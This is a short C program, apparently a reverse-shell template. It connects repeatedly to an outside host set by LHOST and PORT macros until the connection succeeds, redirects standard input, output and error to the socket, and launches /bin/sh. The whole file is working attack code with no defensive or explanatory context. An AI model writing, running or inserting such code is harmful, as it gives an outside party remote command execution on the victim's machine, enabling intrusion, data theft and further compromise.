#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>


int main(void){
  
  int connection_established = 1;
  char ip[] = LHOST;
  int port = PORT;


  struct sockaddr_in sa;
  sa.sin_family = AF_INET;
  sa.sin_port = htons(port);
  sa.sin_addr.s_addr = inet_addr(ip);

  int sockt =  socket(AF_INET, SOCK_STREAM, 0);
  while(connection_established != 0){
    connection_established = connect(sockt, (struct sockaddr *)&sa, sizeof(sa)); 
  }

	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);

	char *const argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);
	return 0;
}
